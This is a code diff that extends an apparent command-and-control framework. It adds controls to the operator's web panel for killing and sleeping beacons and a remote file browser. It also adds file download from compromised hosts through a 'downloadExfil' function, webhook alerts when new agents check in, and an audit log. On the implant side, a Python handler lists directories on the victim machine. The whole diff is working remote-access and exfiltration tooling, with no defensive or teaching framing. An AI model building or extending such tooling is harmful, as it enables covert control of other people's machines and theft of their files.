@@ -354,6 +354,7 @@ let currentAgentId = null;
 let pollTimer = null;
 let agentPollTimer = null;
 let taskHistory = [];  // [{command, output, status, id}]
+let _isAdmin = false;
 
 // ── Toast notifications ───────────────────────────────────
 function showToast(msg, type = 'info') {
@@ -435,6 +436,7 @@ function connectWS() {
   const me = await res.json();
 
   document.getElementById('sidebar-user').textContent = me.username;
+  _isAdmin = !!me.is_admin;
 
   if (me.must_change_password) {
     document.getElementById('pw-modal').classList.add('open');
@@ -600,6 +602,22 @@ async function renderSessionView(agentId) {
           <h3>${t('export_label')}</h3>
           <button class="btn btn-sm btn-ghost" style="width:100%;margin-bottom:6px" onclick="exportTasks('${escapeHtml(agentId)}','txt')">${t('export_txt')}</button>
           <button class="btn btn-sm btn-ghost" style="width:100%" onclick="exportTasks('${escapeHtml(agentId)}','json')">${t('export_json')}</button>
+        </div>
+        <div class="info-card">
+          <h3>⚡ ${_lang==='es'?'Controles rápidos':'Quick Controls'}</h3>
+          <button class="btn btn-sm btn-danger" style="width:100%;margin-bottom:6px" onclick="killBeacon('${escapeHtml(agentId)}')">
+            💀 ${_lang==='es'?'Matar beacon (kill PID)':'Kill beacon (kill PID)'}
+          </button>
+          <button class="btn btn-sm btn-ghost" style="width:100%;margin-bottom:6px" onclick="openFileBrowser('${escapeHtml(agentId)}')">
+            📂 ${_lang==='es'?'File Browser':'File Browser'}
+          </button>
+          <div id="sleep-wrap" style="display:flex;gap:6px;align-items:center;margin-top:4px">
+            <input type="number" id="quick-sleep" value="30" min="1" max="3600"
+              style="width:70px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:4px 6px;outline:none">
+            <button class="btn btn-sm btn-ghost" style="flex:1" onclick="quickSleep('${escapeHtml(agentId)}')">
+              ⏱ Sleep
+            </button>
+          </div>
         </div>
       </div>
       <div class="session-terminal">
@@ -923,6 +941,205 @@ async function saveNote(agentId) {
     method: 'PATCH',
     body: JSON.stringify({ note }),
   });
+}
+
+// ── Quick Controls ────────────────────────────────────────
+async function killBeacon(agentId) {
+  const res = await apiFetch('/api/agents/' + agentId);
+  if (!res || !res.ok) return;
+  const agent = await res.json();
+  if (!agent.pid) { showToast(_lang==='es'?'PID desconocido':'Unknown PID', 'warning'); return; }
+  const msg = _lang === 'es'
+    ? `¿Matar el proceso del beacon? (PID ${agent.pid})\nEl agente dejará de responder.`
+    : `Kill the beacon process? (PID ${agent.pid})\nThe agent will stop responding.`;
+  if (!confirm(msg)) return;
+  const r = await apiFetch('/api/agents/' + agentId + '/tasks', {
+    method: 'POST',
+    body: JSON.stringify({ command: `kill ${agent.pid}` }),
+  });
+  if (r && r.ok) {
+    const task = await r.json();
+    taskHistory.push({ id: task.task_id, command: `kill ${agent.pid}`, status: 'pending', output: '' });
+    renderTerminal();
+    showToast(_lang==='es'?'Comando kill enviado al beacon':'Kill command sent to beacon', 'warning');
+  }
+}
+
+async function quickSleep(agentId) {
+  const secs = parseInt(document.getElementById('quick-sleep').value) || 30;
+  const r = await apiFetch('/api/agents/' + agentId + '/tasks', {
+    method: 'POST',
+    body: JSON.stringify({ command: `sleep ${secs}` }),
+  });
+  if (r && r.ok) {
+    const task = await r.json();
+    taskHistory.push({ id: task.task_id, command: `sleep ${secs}`, status: 'pending', output: '' });
+    renderTerminal();
+    showToast(`Sleep → ${secs}s`, 'info');
+  }
+}
+
+// ── File Browser ──────────────────────────────────────────
+let _fbAgentId = null;
+let _fbCurrentPath = null;
+
+async function openFileBrowser(agentId) {
+  _fbAgentId = agentId;
+  // Get agent info to determine OS and cwd
+  const res = await apiFetch('/api/agents/' + agentId);
+  const agent = res && res.ok ? await res.json() : {};
+  const isWin = (agent.os_info || '').toLowerCase().includes('windows');
+  _fbCurrentPath = agent.cwd || (isWin ? 'C:\\' : '/');
+  showFileBrowserPanel(agentId, isWin);
+}
+
+function showFileBrowserPanel(agentId, isWin) {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="margin-bottom:12px;display:flex;align-items:center;gap:8px">
+      <button class="btn btn-ghost btn-sm" onclick="showView('session','${escapeHtml(agentId)}')">${t('back')}</button>
+      <span style="color:var(--text3);font-size:12px">📂 File Browser</span>
+    </div>
+    <div class="info-card" style="margin:0">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px">
+        <input type="text" id="fb-path-input" value="${escapeHtml(_fbCurrentPath)}"
+          style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:6px 10px;outline:none"
+          onkeydown="if(event.key==='Enter') fbNavigate(document.getElementById('fb-path-input').value)">
+        <button class="btn btn-sm" onclick="fbNavigate(document.getElementById('fb-path-input').value)">
+          ${_lang==='es'?'Ir':'Go'}
+        </button>
+        <button class="btn btn-sm btn-ghost" onclick="openFileBrowser('${escapeHtml(agentId)}')">↻</button>
+      </div>
+      <div id="fb-content" style="min-height:200px">
+        <div style="color:var(--text3);font-size:12px">${_lang==='es'?'Enviando comando...':'Sending command...'}</div>
+      </div>
+    </div>`;
+  fbNavigate(_fbCurrentPath);
+}
+
+async function fbNavigate(path) {
+  if (!_fbAgentId || !path) return;
+  _fbCurrentPath = path;
+  const pathInput = document.getElementById('fb-path-input');
+  if (pathInput) pathInput.value = path;
+  const fbContent = document.getElementById('fb-content');
+  if (fbContent) fbContent.innerHTML = `<div style="color:var(--text3);font-size:12px">${_lang==='es'?'Listando...':'Listing...'}</div>`;
+
+  // Send __ls__ command
+  const r = await apiFetch('/api/agents/' + _fbAgentId + '/tasks', {
+    method: 'POST',
+    body: JSON.stringify({ command: `__ls__:${path}` }),
+  });
+  if (!r || !r.ok) { if (fbContent) fbContent.innerHTML = `<div style="color:var(--danger)">Error</div>`; return; }
+  const task = await r.json();
+
+  // Poll for result
+  let attempts = 0;
+  const poll = setInterval(async () => {
+    attempts++;
+    if (attempts > 30) { clearInterval(poll); return; }
+    const tr = await apiFetch(`/api/agents/${_fbAgentId}/tasks/${task.task_id}`);
+    if (!tr || !tr.ok) return;
+    const td = await tr.json();
+    if (td.status !== 'done' && td.status !== 'error') return;
+    clearInterval(poll);
+    renderFileListing(td.output, _fbAgentId);
+  }, 1500);
+}
+
+function renderFileListing(output, agentId) {
+  const fbContent = document.getElementById('fb-content');
+  if (!fbContent) return;
+  if (!output || output.startsWith('Error')) {
+    fbContent.innerHTML = `<div style="color:var(--danger);font-size:12px">${escapeHtml(output || 'Error listing directory')}</div>`;
+    return;
+  }
+  let data;
+  try { data = JSON.parse(output); } catch { data = null; }
+  if (!data || !data.entries) {
+    fbContent.innerHTML = `<div style="color:var(--danger);font-size:12px">${escapeHtml(output)}</div>`;
+    return;
+  }
+  const isWin = data.path && data.path.includes('\\');
+  const sep = isWin ? '\\' : '/';
+  const parentPath = data.path.includes(sep)
+    ? data.path.substring(0, data.path.lastIndexOf(sep)) || sep
+    : data.path;
+
+  fbContent.innerHTML = `
+    <table style="width:100%;font-size:12px">
+      <thead>
+        <tr>
+          <th style="text-align:left">${_lang==='es'?'Nombre':'Name'}</th>
+          <th style="width:90px;text-align:right">${_lang==='es'?'Tamaño':'Size'}</th>
+          <th style="width:60px"></th>
+        </tr>
+      </thead>
+      <tbody>
+        ${data.path !== parentPath ? `
+        <tr>
+          <td colspan="3">
+            <button class="btn btn-sm btn-ghost" style="font-family:var(--font-mono);font-size:11px;width:100%;text-align:left"
+              onclick="fbNavigate('${escapeHtml(parentPath)}')">📁 ..</button>
+          </td>
+        </tr>` : ''}
+        ${data.entries.map(e => {
+          const fullPath = data.path.endsWith(sep) ? data.path + e.name : data.path + sep + e.name;
+          const icon = e.type === 'dir' ? '📁' : '📄';
+          const sizeStr = e.type === 'dir' ? '—' : formatSize(e.size);
+          return `<tr>
+            <td>
+              ${e.type === 'dir'
+                ? `<button class="btn btn-sm btn-ghost" style="font-family:var(--font-mono);font-size:11px;text-align:left;width:100%;justify-content:flex-start"
+                    onclick="fbNavigate('${escapeHtml(fullPath)}')">${icon} ${escapeHtml(e.name)}</button>`
+                : `<span style="font-family:var(--font-mono);font-size:11px;color:var(--text2)">${icon} ${escapeHtml(e.name)}</span>`
+              }
+            </td>
+            <td style="text-align:right;color:var(--text3);font-family:var(--font-mono);font-size:11px">${sizeStr}</td>
+            <td style="text-align:right">
+              ${e.type !== 'dir'
+                ? `<button class="btn btn-sm btn-ghost" style="padding:2px 8px;font-size:10px"
+                    onclick="fbDownload('${escapeHtml(agentId)}','${escapeHtml(fullPath)}','${escapeHtml(e.name)}')">⬇</button>`
+                : ''}
+            </td>
+          </tr>`;
+        }).join('')}
+      </tbody>
+    </table>`;
+}
+
+async function fbDownload(agentId, fullPath, filename) {
+  const r = await apiFetch('/api/agents/' + agentId + '/tasks', {
+    method: 'POST',
+    body: JSON.stringify({ command: `download ${fullPath}` }),
+  });
+  if (!r || !r.ok) { showToast('Error', 'danger'); return; }
+  const task = await r.json();
+  showToast(`⬇ ${_lang==='es'?'Descargando':'Downloading'} ${filename}...`, 'info');
+  // Poll and auto-download when done
+  let attempts = 0;
+  const poll = setInterval(async () => {
+    attempts++;
+    if (attempts > 40) { clearInterval(poll); showToast('Timeout', 'warning'); return; }
+    const tr = await apiFetch(`/api/agents/${agentId}/tasks/${task.task_id}`);
+    if (!tr || !tr.ok) return;
+    const td = await tr.json();
+    if (td.status !== 'done' && td.status !== 'error') return;
+    clearInterval(poll);
+    if (td.status === 'error' || !td.output?.startsWith('__b64file__:')) {
+      showToast(`✗ ${_lang==='es'?'Error al descargar':'Download error'}`, 'danger'); return;
+    }
+    await downloadExfil(agentId, task.task_id, filename);
+    showToast(`✓ ${filename}`, 'success');
+  }, 1500);
+}
+
+function formatSize(bytes) {
+  if (bytes === 0) return '0 B';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+  return (bytes / 1073741824).toFixed(1) + ' GB';
 }
 
 // ── Redirector Config View ────────────────────────────────
@@ -1378,6 +1595,75 @@ async function renderSettingsView() {
         </div>
       </div>
 
+      <!-- Webhook -->
+      <div class="info-card" style="margin:0">
+        <h3>🔔 Webhook</h3>
+        <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
+          ${_lang==='es'?'Notificaciones a Discord / Slack / cualquier webhook. Usa un embed de Discord por defecto.':'Notifications to Discord / Slack / any webhook. Uses Discord embed format by default.'}
+        </p>
+        <div class="form-group" style="margin-bottom:10px">
+          <label>Webhook URL</label>
+          <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/..." style="font-family:var(--font-mono);font-size:11px">
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:10px 24px;margin-bottom:14px" id="wh-events-wrap">
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="whe-new_agent" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Nuevo agente':'New agent'}</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="whe-login" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Login exitoso':'Successful login'}</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="whe-login_fail" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Login fallido':'Failed login'}</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="whe-agent_deleted" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Agente eliminado':'Agent deleted'}</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="whe-task_sent" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Tarea enviada':'Task sent'}</span>
+          </label>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+            <input type="checkbox" id="wh-enabled" style="accent-color:var(--accent)">
+            <span>${_lang==='es'?'Activar':'Enable'}</span>
+          </label>
+          <button class="btn btn-sm" onclick="saveWebhook()">${_lang==='es'?'Guardar':'Save'}</button>
+          <button class="btn btn-sm btn-ghost" onclick="testWebhook()">${_lang==='es'?'Probar':'Test'}</button>
+          <span id="wh-status" style="font-size:12px;color:var(--text3)"></span>
+        </div>
+      </div>
+
+      ${_isAdmin ? `
+      <!-- Audit Log (admin only) -->
+      <div class="info-card" style="margin:0">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+          <h3 style="margin:0">🔍 ${_lang==='es'?'Registro de auditoría':'Audit Log'}</h3>
+          <div style="display:flex;gap:8px;align-items:center">
+            <select id="audit-filter" onchange="loadAuditLog()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:4px 8px;outline:none">
+              <option value="">${_lang==='es'?'Todos':'All'}</option>
+              <option value="LOGIN">LOGIN</option>
+              <option value="LOGIN_FAIL">LOGIN_FAIL</option>
+              <option value="TASK_SENT">TASK_SENT</option>
+              <option value="FILE_UPLOAD">FILE_UPLOAD</option>
+              <option value="AGENT_DELETED">AGENT_DELETED</option>
+              <option value="USER_CREATED">USER_CREATED</option>
+              <option value="USER_DELETED">USER_DELETED</option>
+              <option value="PASSWORD_CHANGED">PASSWORD_CHANGED</option>
+            </select>
+            <button class="btn btn-sm btn-ghost" onclick="loadAuditLog()">↻</button>
+            <button class="btn btn-sm btn-danger" onclick="clearAuditLog()" style="font-size:11px">${_lang==='es'?'Limpiar':'Clear'}</button>
+          </div>
+        </div>
+        <div id="audit-tbody" style="max-height:340px;overflow-y:auto">
+          <div style="color:var(--text3);font-size:12px">${_lang==='es'?'Cargando...':'Loading...'}</div>
+        </div>
+      </div>` : ''}
+
     </div>`;
 
   // Load current whitelist
@@ -1403,6 +1689,10 @@ async function renderSettingsView() {
   loadMfaStatus();
   // Load users
   loadUsers();
+  // Load webhook config
+  loadWebhookConfig();
+  // Load audit log (admin only)
+  if (_isAdmin) loadAuditLog();
 }
 
 // ── MFA ───────────────────────────────────────────────────────────────────────
@@ -2152,6 +2442,30 @@ def run_command(cmd, task_id=None):
                     _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(f'PTY error: {_e}\\n'.encode()).decode()})
         _th.Thread(target=_pty_run, daemon=True).start()
         return '__pty_started__'
+
+    if cmd.startswith("__ls__:"):
+        import json as _jmod, stat as _stat
+        ls_path = cmd[7:].strip() or _cwd
+        if not os.path.isabs(ls_path):
+            ls_path = os.path.join(_cwd, ls_path)
+        try:
+            entries = []
+            with os.scandir(ls_path) as _it:
+                for _e in _it:
+                    try:
+                        _st = _e.stat(follow_symlinks=False)
+                        entries.append({
+                            "name": _e.name,
+                            "type": "dir" if _e.is_dir(follow_symlinks=False) else "file",
+                            "size": _st.st_size if not _e.is_dir() else 0,
+                            "modified": int(_st.st_mtime),
+                        })
+                    except Exception:
+                        entries.append({"name": _e.name, "type": "unknown", "size": 0, "modified": 0})
+            entries.sort(key=lambda x: (x["type"] != "dir", x["name"].lower()))
+            return _jmod.dumps({"path": os.path.abspath(ls_path), "entries": entries})
+        except Exception as _le:
+            return f"Error: {_le}"
 
     if cmd.startswith("shell "): cmd = cmd[6:]
     try:
@@ -3040,6 +3354,113 @@ async function submitUpload() {
   });
   renderTerminal();
   closeUploadModal();
+}
+
+// ── Webhook settings ─────────────────────────────────────
+async function loadWebhookConfig() {
+  const res = await apiFetch('/api/settings/webhook');
+  if (!res || !res.ok) return;
+  const cfg = await res.json();
+  const urlEl = document.getElementById('wh-url');
+  const enEl  = document.getElementById('wh-enabled');
+  if (!urlEl) return;
+  urlEl.value = cfg.url || '';
+  if (enEl) enEl.checked = !!cfg.enabled;
+  const events = cfg.events || {};
+  for (const k of ['new_agent','login','login_fail','agent_deleted','task_sent']) {
+    const el = document.getElementById(`whe-${k}`);
+    if (el) el.checked = !!events[k];
+  }
+}
+
+async function saveWebhook() {
+  const statusEl = document.getElementById('wh-status');
+  const url = document.getElementById('wh-url').value.trim();
+  const enabled = document.getElementById('wh-enabled').checked;
+  const events = {};
+  for (const k of ['new_agent','login','login_fail','agent_deleted','task_sent']) {
+    const el = document.getElementById(`whe-${k}`);
+    events[k] = el ? el.checked : false;
+  }
+  statusEl.textContent = _lang === 'es' ? 'Guardando...' : 'Saving...';
+  const res = await apiFetch('/api/settings/webhook', {
+    method: 'POST',
+    body: JSON.stringify({ url, enabled, events }),
+  });
+  if (!res || !res.ok) {
+    statusEl.textContent = '✗ Error'; statusEl.style.color = 'var(--danger)'; return;
+  }
+  statusEl.textContent = '✓'; statusEl.style.color = 'var(--online)';
+  setTimeout(() => { if (statusEl) statusEl.textContent = ''; }, 2000);
+}
+
+async function testWebhook() {
+  const statusEl = document.getElementById('wh-status');
+  statusEl.textContent = _lang === 'es' ? 'Enviando...' : 'Sending...';
+  statusEl.style.color = 'var(--text3)';
+  const res = await apiFetch('/api/settings/webhook/test', { method: 'POST' });
+  if (!res || !res.ok) {
+    const d = await res?.json().catch(() => ({}));
+    statusEl.textContent = `✗ ${d.detail || 'Error'}`; statusEl.style.color = 'var(--danger)'; return;
+  }
+  statusEl.textContent = '✓ Sent'; statusEl.style.color = 'var(--online)';
+  setTimeout(() => { if (statusEl) statusEl.textContent = ''; }, 3000);
+}
+
+// ── Audit log ─────────────────────────────────────────────
+const _ACTION_COLORS = {
+  LOGIN: 'var(--online)', LOGIN_FAIL: 'var(--danger)', TASK_SENT: 'var(--accent)',
+  FILE_UPLOAD: 'var(--accent2)', AGENT_DELETED: 'var(--warning)',
+  USER_CREATED: 'var(--online)', USER_DELETED: 'var(--danger)',
+  PASSWORD_CHANGED: 'var(--warning)',
+};
+
+async function loadAuditLog() {
+  const container = document.getElementById('audit-tbody');
+  if (!container) return;
+  const filterEl = document.getElementById('audit-filter');
+  const filter = filterEl ? filterEl.value : '';
+  const url = `/api/audit/logs${filter ? `?action=${filter}` : ''}`;
+  const res = await apiFetch(url);
+  if (!res || !res.ok) {
+    container.innerHTML = `<div style="color:var(--danger);font-size:12px">Access denied — admin only</div>`;
+    return;
+  }
+  const logs = await res.json();
+  if (!logs.length) {
+    container.innerHTML = `<div style="color:var(--text3);font-size:12px;text-align:center;padding:14px">${_lang==='es'?'Sin registros':'No entries'}</div>`;
+    return;
+  }
+  container.innerHTML = `<table style="width:100%;font-size:11px">
+    <thead>
+      <tr>
+        <th style="width:140px">${_lang==='es'?'Fecha':'Time'}</th>
+        <th style="width:90px">${_lang==='es'?'Actor':'Actor'}</th>
+        <th style="width:120px">${_lang==='es'?'Acción':'Action'}</th>
+        <th>${_lang==='es'?'Detalle':'Detail'}</th>
+        <th style="width:110px">IP</th>
+      </tr>
+    </thead>
+    <tbody>
+      ${logs.map(l => {
+        const ts = l.timestamp ? new Date(l.timestamp).toLocaleString() : '—';
+        const color = _ACTION_COLORS[l.action] || 'var(--text2)';
+        return `<tr>
+          <td style="color:var(--text3);font-family:var(--font-mono)">${escapeHtml(ts)}</td>
+          <td style="color:var(--accent2)">${escapeHtml(l.actor)}</td>
+          <td><span style="color:${color};font-weight:600">${escapeHtml(l.action)}</span></td>
+          <td style="color:var(--text2);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHtml(l.detail)}">${escapeHtml(l.detail)}</td>
+          <td style="color:var(--text3);font-family:var(--font-mono)">${escapeHtml(l.ip||'—')}</td>
+        </tr>`;
+      }).join('')}
+    </tbody>
+  </table>`;
+}
+
+async function clearAuditLog() {
+  if (!confirm(_lang==='es'?'¿Limpiar todo el registro de auditoría?':'Clear all audit log entries?')) return;
+  const res = await apiFetch('/api/audit/logs', { method: 'DELETE' });
+  if (res && res.ok) loadAuditLog();
 }
 
 // ── Helpers ──────────────────────────────────────────────
